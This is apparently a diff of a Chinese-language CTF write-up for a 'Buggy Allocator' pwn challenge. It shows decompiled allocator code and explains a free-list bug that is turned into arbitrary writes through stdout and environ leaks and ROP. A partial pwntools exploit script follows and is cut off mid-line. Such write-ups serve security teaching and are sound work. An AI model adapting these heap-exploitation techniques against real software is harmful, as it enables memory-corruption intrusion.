-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;*** Buggy  Allocator***&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v0, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  v1 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;***     1. Alloc    ***&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v1, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  v2 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;***     2. Dealloc  ***&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v2, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> choice; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_4019D7(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      <span class="built_in">std</span>::istream::operator&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;choice);</span><br><span class="line">      <span class="keyword">if</span> ( choice != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( choice != <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Invalid Choice&quot;</span>);</span><br><span class="line">      <span class="built_in">std</span>::ostream::operator&lt;&lt;(v3, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    delete();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">sub_4019D7</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> a3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+      <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      std<span class="token operator">::</span>istream<span class="token operator">::</span>operator<span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cin<span class="token punctuation">,</span> <span class="token operator">&amp;</span>choice<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+        <span class="token keyword">break</span><span class="token punctuation">;</span>
+      <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+      v3 <span class="token operator">=</span> std<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"Invalid Choice"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      std<span class="token operator">::</span>ostream<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> <span class="token operator">&amp;</span>std<span class="token operator">::</span>endl<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>，其中alloc申请大于 0x80 会使用malloc函数分配内存(ptmalloc2)，小于等于 0x80会使用自定义的堆管理器去分配内存</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">_QWORD *__fastcall alloc_memory(size_t size)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; // rax</span><br><span class="line">  _QWORD **v3; // [rsp+18h] [rbp-18h]</span><br><span class="line">  _QWORD *v4; // [rsp+20h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  if ( !size )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( size &gt; 0x80 )</span><br><span class="line">    return malloc_(size);</span><br><span class="line">  v3 = (_QWORD **)&amp;free_list[get_idx(size)];</span><br><span class="line">  v4 = *v3;</span><br><span class="line">  if ( *v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    *v3 = (_QWORD *)*v4;</span><br><span class="line">    return v4;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = Alignment_size(size);</span><br><span class="line">    return refill(v2);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">_QWORD *__fastcall alloc_memory(size_t size)
+&#123;
+  __int64 v2; &#x2F;&#x2F; rax
+  _QWORD **v3; &#x2F;&#x2F; [rsp+18h] [rbp-18h]
+  _QWORD *v4; &#x2F;&#x2F; [rsp+20h] [rbp-10h]
+
+  if ( !size )
+    return 0LL;
+  if ( size &gt; 0x80 )
+    return malloc_(size);
+  v3 &#x3D; (_QWORD **)&amp;free_list[get_idx(size)];
+  v4 &#x3D; *v3;
+  if ( *v3 )
+  &#123;
+    *v3 &#x3D; (_QWORD *)*v4;
+    return v4;
+  &#125;
+  else
+  &#123;
+    v2 &#x3D; Alignment_size(size);
+    return refill(v2);
+  &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>自定义的堆管理器维护一个free_list，申请内存的时候，当free list中没有申请大小的堆块时，就会调用refill 填充空闲区域(arena_end - arena_start)，填充完后free list中拿，当空闲区域不够refill的时候会判断free list中有没有更大的堆块可以进行refill，如果都不满足会调用malloc申请名称</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">_QWORD *__fastcall refill(unsigned __int64 size)</span><br><span class="line">&#123;</span><br><span class="line">  int nobjs; // [rsp+18h] [rbp-38h] BYREF</span><br><span class="line">  int i; // [rsp+1Ch] [rbp-34h]</span><br><span class="line">  _QWORD *current_obj; // [rsp+20h] [rbp-30h]</span><br><span class="line">  _QWORD *v5; // [rsp+28h] [rbp-28h]</span><br><span class="line">  _QWORD *my_free_list; // [rsp+30h] [rbp-20h]</span><br><span class="line">  _QWORD *v7; // [rsp+38h] [rbp-18h]</span><br><span class="line">  _QWORD *next_obj; // [rsp+40h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v9; // [rsp+48h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(0x28u);</span><br><span class="line">  nobjs = 20;</span><br><span class="line">  v5 = (_QWORD *)chunk_alloc(size, &amp;nobjs);</span><br><span class="line">  if ( nobjs == 1 )</span><br><span class="line">    return v5;</span><br><span class="line">  my_free_list = &amp;free_list[get_idx(size)];</span><br><span class="line">  v7 = v5;</span><br><span class="line">  current_obj = v5;</span><br><span class="line">  *my_free_list = (char *)v5 + size;</span><br><span class="line">  for ( i = 0; i != nobjs - 1; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    next_obj = (_QWORD *)((char *)current_obj + size);</span><br><span class="line">    *current_obj = (char *)current_obj + size;</span><br><span class="line">    current_obj = next_obj;</span><br><span class="line">  &#125;</span><br><span class="line">  return v7;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_QWORD *__fastcall chunk_alloc(unsigned __int64 size, int *nobjs)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 idx; // rax</span><br><span class="line">  int i; // [rsp+14h] [rbp-3Ch]</span><br><span class="line">  unsigned __int64 all_size; // [rsp+18h] [rbp-38h]</span><br><span class="line">  unsigned __int64 available_size; // [rsp+20h] [rbp-30h]</span><br><span class="line">  _QWORD *arena_start_ptr; // [rsp+28h] [rbp-28h]</span><br><span class="line">  size_t v8; // [rsp+38h] [rbp-18h]</span><br><span class="line">  _QWORD **v9; // [rsp+40h] [rbp-10h]</span><br><span class="line">  _QWORD *v10; // [rsp+48h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  all_size = size * *nobjs;</span><br><span class="line">  available_size = arena_end - arena_start;</span><br><span class="line">  arena_start_ptr = (_QWORD *)arena_start;</span><br><span class="line">  if ( all_size &gt; arena_end - arena_start )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( available_size &lt; size )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( available_size )</span><br><span class="line">      &#123;</span><br><span class="line">        arena_start = arena_end;</span><br><span class="line">        idx = get_idx(available_size);</span><br><span class="line">        *arena_start_ptr = free_list[idx];</span><br><span class="line">        free_list[idx] = arena_start_ptr;</span><br><span class="line">      &#125;</span><br><span class="line">      v8 = 2 * all_size;</span><br><span class="line">      for ( i = size; i &lt;= 128; i += 8 )</span><br><span class="line">      &#123;</span><br><span class="line">        v9 = (_QWORD **)&amp;free_list[get_idx(i)];</span><br><span class="line">        v10 = *v9;</span><br><span class="line">        if ( *v9 )</span><br><span class="line">        &#123;</span><br><span class="line">          *v9 = (_QWORD *)*v10;</span><br><span class="line">          arena_start = (__int64)v10;</span><br><span class="line">          arena_end = (__int64)v10 + i;</span><br><span class="line">          return chunk_alloc(size, nobjs);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      arena_end = 0LL;</span><br><span class="line">      arena_start = (__int64)malloc_(v8);</span><br><span class="line">      arena_end = arena_start + v8;</span><br><span class="line">      return chunk_alloc(size, nobjs);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      *nobjs = available_size / size;</span><br><span class="line">      arena_start += size * *nobjs;</span><br><span class="line">      return arena_start_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    arena_start += all_size;</span><br><span class="line">    return arena_start_ptr;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">_QWORD *__fastcall refill(unsigned __int64 size)
+&#123;
+  int nobjs; &#x2F;&#x2F; [rsp+18h] [rbp-38h] BYREF
+  int i; &#x2F;&#x2F; [rsp+1Ch] [rbp-34h]
+  _QWORD *current_obj; &#x2F;&#x2F; [rsp+20h] [rbp-30h]
+  _QWORD *v5; &#x2F;&#x2F; [rsp+28h] [rbp-28h]
+  _QWORD *my_free_list; &#x2F;&#x2F; [rsp+30h] [rbp-20h]
+  _QWORD *v7; &#x2F;&#x2F; [rsp+38h] [rbp-18h]
+  _QWORD *next_obj; &#x2F;&#x2F; [rsp+40h] [rbp-10h]
+  unsigned __int64 v9; &#x2F;&#x2F; [rsp+48h] [rbp-8h]
+
+  v9 &#x3D; __readfsqword(0x28u);
+  nobjs &#x3D; 20;
+  v5 &#x3D; (_QWORD *)chunk_alloc(size, &amp;nobjs);
+  if ( nobjs &#x3D;&#x3D; 1 )
+    return v5;
+  my_free_list &#x3D; &amp;free_list[get_idx(size)];
+  v7 &#x3D; v5;
+  current_obj &#x3D; v5;
+  *my_free_list &#x3D; (char *)v5 + size;
+  for ( i &#x3D; 0; i !&#x3D; nobjs - 1; ++i )
+  &#123;
+    next_obj &#x3D; (_QWORD *)((char *)current_obj + size);
+    *current_obj &#x3D; (char *)current_obj + size;
+    current_obj &#x3D; next_obj;
+  &#125;
+  return v7;
+&#125;
+
+_QWORD *__fastcall chunk_alloc(unsigned __int64 size, int *nobjs)
+&#123;
+  unsigned __int64 idx; &#x2F;&#x2F; rax
+  int i; &#x2F;&#x2F; [rsp+14h] [rbp-3Ch]
+  unsigned __int64 all_size; &#x2F;&#x2F; [rsp+18h] [rbp-38h]
+  unsigned __int64 available_size; &#x2F;&#x2F; [rsp+20h] [rbp-30h]
+  _QWORD *arena_start_ptr; &#x2F;&#x2F; [rsp+28h] [rbp-28h]
+  size_t v8; &#x2F;&#x2F; [rsp+38h] [rbp-18h]
+  _QWORD **v9; &#x2F;&#x2F; [rsp+40h] [rbp-10h]
+  _QWORD *v10; &#x2F;&#x2F; [rsp+48h] [rbp-8h]
+
+  all_size &#x3D; size * *nobjs;
+  available_size &#x3D; arena_end - arena_start;
+  arena_start_ptr &#x3D; (_QWORD *)arena_start;
+  if ( all_size &gt; arena_end - arena_start )
+  &#123;
+    if ( available_size &lt; size )
+    &#123;
+      if ( available_size )
+      &#123;
+        arena_start &#x3D; arena_end;
+        idx &#x3D; get_idx(available_size);
+        *arena_start_ptr &#x3D; free_list[idx];
+        free_list[idx] &#x3D; arena_start_ptr;
+      &#125;
+      v8 &#x3D; 2 * all_size;
+      for ( i &#x3D; size; i &lt;&#x3D; 128; i +&#x3D; 8 )
+      &#123;
+        v9 &#x3D; (_QWORD **)&amp;free_list[get_idx(i)];
+        v10 &#x3D; *v9;
+        if ( *v9 )
+        &#123;
+          *v9 &#x3D; (_QWORD *)*v10;
+          arena_start &#x3D; (__int64)v10;
+          arena_end &#x3D; (__int64)v10 + i;
+          return chunk_alloc(size, nobjs);
+        &#125;
+      &#125;
+      arena_end &#x3D; 0LL;
+      arena_start &#x3D; (__int64)malloc_(v8);
+      arena_end &#x3D; arena_start + v8;
+      return chunk_alloc(size, nobjs);
+    &#125;
+    else
+    &#123;
+      *nobjs &#x3D; available_size &#x2F; size;
+      arena_start +&#x3D; size * *nobjs;
+      return arena_start_ptr;
+    &#125;
+  &#125;
+  else
+  &#123;
+    arena_start +&#x3D; all_size;
+    return arena_start_ptr;
+  &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>存在漏洞的地方是建立链表的时候不会将最后一个obj的next指针置空，可以通过堆块上残留的数据伪造一个指针破坏链表，实现任意地址分配</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for ( i = 0; i != nobjs - 1; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  next_obj = (_QWORD *)((char *)current_obj + size);</span><br><span class="line">  *current_obj = (char *)current_obj + size;</span><br><span class="line">  current_obj = next_obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">for ( i &#x3D; 0; i !&#x3D; nobjs - 1; ++i )
+&#123;
+  next_obj &#x3D; (_QWORD *)((char *)current_obj + size);
+  *current_obj &#x3D; (char *)current_obj + size;
+  current_obj &#x3D; next_obj;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>利用的思路是，首先申请大量的堆块，使arena_end - arena_start尽可能的小，这样申请小块内存的时候,建立freelist,会优先从free list中的大堆块中建立，而不是从后面空闲内存那建立，利用大堆块中残留的数据伪造next指针破坏freelist实现任意地址写，写IO_2_1_stdout 通过puts的利用链将libc的地址泄露出来后，再通过environ泄露栈地址，最后写rop</p>
 <p>关于puts函数泄露任意地址 IO_2_1_stdout利用链的分析</p>
@@ -509,1525 +454,271 @@
 <p>简单来说 当 write_ptr &gt; write_base时 ，会将write_base这个地址中大小为 (write_ptr - write_base)的数据泄露出来，</p>
 <p>其中flag要为特定值才能绕过前面几个cmp，write_end要小于等于 write_ptr</p>
 <p>exp</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line">IP = <span class="string">&quot;47.100.139.115&quot;</span></span><br><span class="line">PORT = <span class="number">30708</span></span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    <span class="keyword">return</span> remote(IP, PORT) <span class="keyword">if</span> <span class="keyword">not</span> is_debug <span class="keyword">else</span> process()</span><br><span class="line"></span><br><span class="line">p = connect()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Content&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dealloc</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stdout_addr = <span class="number">0x404040</span></span><br><span class="line">alloc(<span class="number">0</span>,<span class="number">0x80</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x38</span>+p64(stdout_addr)+<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">alloc(<span class="number">1</span>,<span class="number">0x80</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0xDEADBEAF</span>)+<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#清空0x80的freelist 使得 arena_end - arena_start &lt; 0x38 这样申请内存就会从0x80的free list中切割然后拿了</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">40</span>):</span><br><span class="line">    alloc(i,<span class="number">0x80</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#释放一个0x80堆块用来建立0x38的freelist</span></span><br><span class="line">dealloc(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#尝试分配0x38,由于对应freelist为空,在刚释放的0x80(0号)上建立链表并填充0x38的freelist</span></span><br><span class="line">alloc(<span class="number">0</span>,<span class="number">0x38</span>,<span class="string">&#x27;C&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line"><span 